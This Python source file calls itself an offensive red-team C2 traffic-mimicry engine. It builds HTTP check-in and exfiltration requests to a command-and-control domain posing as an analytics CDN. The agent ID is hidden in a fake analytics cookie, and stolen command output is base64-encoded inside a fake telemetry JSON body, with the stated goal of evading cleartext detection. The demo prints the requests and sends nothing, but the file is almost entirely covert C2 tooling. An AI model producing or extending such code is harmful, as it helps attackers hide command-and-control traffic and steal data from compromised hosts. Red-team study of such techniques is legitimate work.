import base64
import json
import random
from typing import Dict, Tuple

class RedTeamMalleableHTTPProfile:
    """
    Offensive C2 Malleable HTTP Traffic Mimic Engine.
    Encapsulates C2 commands within legitimate-looking HTTP GET/POST headers and payloads.
    """
    def __init__(self, c2_domain: str = "analytics-cdn-service.com"):
        self.c2_domain = c2_domain
        self.agent_id = "AGENT_NODE_8821"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
        ]

    def _encode_payload(self, data_str: str) -> str:
        """Helper method: Converts raw payload string to Base64 to bypass cleartext string detection."""
        encoded_bytes = base64.b64encode(data_str.encode("utf-8"))
        return encoded_bytes.decode("utf-8")

    def create_get_checkin_request(self) -> Tuple[str, Dict[str, str]]:
        """
        Generates a fake HTTP GET request structure disguised as a telemetry/analytics check-in.
        C2 Agent ID is hidden inside the Cookie header.
        """
        uri = "/api/v1/telemetry/config"
        
        # Hide Agent ID inside a fake session/analytics cookie
        raw_cookie_data = json.dumps({"session_token": self.agent_id, "v": "1.0.4"})
        encoded_cookie = self._encode_payload(raw_cookie_data)

        headers = {
            "Host": self.c2_domain,
            "User-Agent": random.choice(self.user_agents),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"__ga_session={encoded_cookie}; _session_id=active",
            "Connection": "keep-alive"
        }
        return uri, headers

    def create_post_exfiltration_request(self, command_output: str) -> Tuple[str, Dict[str, str], str]:
        """
        Generates a fake HTTP POST request structure disguised as a metric submission.
        Command outputs are hidden inside a JSON payload body.
        """
        uri = "/api/v1/telemetry/submit"
        
        encoded_output = self._encode_payload(command_output)
        
        body_data = {
            "event_type": "USER_METRICS",
            "client_id": self.agent_id,
            "metric_data": encoded_output
        }
        json_body = json.dumps(body_data)

        headers = {
            "Host": self.c2_domain,
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/json",
            "Content-Length": str(len(json_body)),
            "Connection": "keep-alive"
        }
        return uri, headers, json_body


if __name__ == "__main__":
    print("==================================================")
    print(" OFFENSIVE C2 MALLEABLE HTTP PROFILE ENGINE")
    print("==================================================\n")

    http_agent = RedTeamMalleableHTTPProfile()

    # 1. Simulating GET Request (Check-in)
    get_uri, get_headers = http_agent.create_get_checkin_request()
    print("[1] Generated Fake HTTP GET Request (Check-in):")
    print(f" -> URI: {get_uri}")
    print(f" -> Headers: {json.dumps(get_headers, indent=4)}\n")

    # 2. Simulating POST Request (Data Exfiltration)
    sample_output = "Desktop-PC\\Admin_User - Privilege Level: HIGH"
    post_uri, post_headers, post_body = http_agent.create_post_exfiltration_request(sample_output)
    print("[2] Generated Fake HTTP POST Request (Exfiltration):")
    print(f" -> URI: {post_uri}")
    print(f" -> Headers: {json.dumps(post_headers, indent=4)}")
    print(f" -> Body Payload: {post_body}\n")